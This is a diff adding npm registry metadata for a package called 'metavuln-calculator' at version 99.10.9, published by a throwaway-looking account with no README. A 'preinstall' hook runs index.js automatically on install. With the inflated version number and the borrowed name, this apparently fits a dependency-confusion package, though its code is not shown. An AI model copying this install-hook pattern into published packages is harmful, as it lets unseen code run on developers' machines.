@@ -1,0 +1,62 @@
+{
+    "_id": "metavuln-calculator",
+    "name": "metavuln-calculator",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "metavuln-calculator",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "metavuln-calculator@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-EIviGIxurQLZ4hIfqsOH8wOYm23Sl4Ce7278vKrJR/yk9r+vKdznjUnAbC4Rs2GY9GfoKWJ9UvTY4po56DMmeA==",
+                "shasum": "2b69c4db23ea064331c841e5d00fd25b00677577",
+                "tarball": "https://registry.npmjs.org/metavuln-calculator/-/metavuln-calculator-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5071,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPLH0ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr7Dw/8C6KQr9U6T0w8wUuwn2qxBMYNoa401fJVDWsEZSwsvTu4hH3f\r\nNOwRjV6/46VsEhBXqPnmVlwL6eLLlaBF+7SMu5Cn2zKkx4l8WXmY449+slsj\r\nSYnoxLibvCuZM+S5N+OP2Lk/S/xAS3pV+WCLg6K7RqgpkxrmuxZd1qzsIOfz\r\nnoP9M0Qaa6eXYtMIfXoM0qZ2vMOyuWi9N+jnVpy5i2eUu//+1Ypazw50Pi0N\r\n6MS+qwdOBhvtsR35If+R3suBdwbFYDNX40gNJ1Vhr9NU5Ifm2b+fHFx5VXTX\r\n0K/JM4IkXbvm1ejkt0ReDESd4bNbzX3zqkhd4V5b+URrebepcfMl1W3FkIkN\r\nbvorulYONNkX/takB12LhvFmyB+dCg0A5Prb/TyoEV1EM9XdfE/zzB6d1iSy\r\njK2BAunUdZWR3rL/v/9264S7BvkASHyP37wr3/EaE/9cbALoFlVfC180BLUZ\r\nBmjK69XgD9YYkgQJJpq0z/2TZcQca5ZpaeHviIuvOLvWG5Yd78F4DxZHoAZV\r\n3VezfWxWCCS66TtrS3lvghAzlnba0NR9/8XlQhIfjXG3AIvUobIYiJfPyzQ1\r\ne2qzpUMOpGkkbV+a3cb8B9n/o/EE1ke1xWz2r+p4NBtmUWNQvEq0GHYpjYlS\r\nJgrL2FjwnY59Se0xkhI890UPHYD238OiIII=\r\n=hWht\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "f4jjiqyc",
+                "email": "f4jjiqyc@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "f4jjiqyc",
+                    "email": "f4jjiqyc@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/metavuln-calculator_99.10.9_1648144884060_0.03205432709151612"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T18:01:24.060Z",
+        "99.10.9": "2022-03-24T18:01:24.205Z",
+        "modified": "2022-03-24T18:01:24.294Z"
+    },
+    "maintainers": [
+        {
+            "name": "f4jjiqyc",
+            "email": "f4jjiqyc@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
